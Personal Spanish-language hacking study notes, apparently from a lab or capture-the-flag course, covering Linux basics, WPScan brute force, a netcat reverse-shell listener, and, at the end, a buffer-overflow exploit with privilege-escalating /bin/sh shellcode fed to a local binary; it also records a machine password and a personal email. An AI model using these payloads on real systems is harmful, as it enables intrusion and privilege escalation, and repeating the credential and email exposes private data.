buscar en man on "/keyword", ir adelante on N y hacia atras con SUPR-N
chown cambia proprietario de un fichero

## VIM
:wq write qui
:q! quit and force

## XARGAS
ejecuta algo como argumento final un output

## ALIAS
alias loqueyoquiera="ls"    cerrando la sessión pierdes el alias
para hacerlo fijo meter en /.bashrc el alias


## WPscan
utilzado para sacar información sobre los usuarios que se utilizan en la pagina basada en wordpress
también se usa como brute-force para paginas web basadas en wordpress

## Google dorking
buscador más profundo de información
site: sitio "keywoards"

## Netcad
Utilizado para abrir puertos en la maquina a utilizar como reverse shell
netcad -nvlp "puerto puesto" https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php


## SSH
es posible utilizar la llave RSA para poder entrar con ssh utilizando el flag -i

buscar en un directorio llaves RSA existentes y utilizables:
find. -type f- -exec sh -c 'echo "Analizando archivo: $1"; ssh-keygen -l -f $1' _ {} \;


contraseña maquina wido T4ll3r_H4ck1nG_2024!
correo para el premio: sermomo3@alumni.uv.es

run $(python2 -c 'print "A"*88')


run $(python2 -c 'print "\x90"*35+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x64\xf4\xff\xbf"')


/home/wido/pruebas_seguridad/script $(python2 -c 'print "\x90"*35+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x64\xf4\xff\xbf"')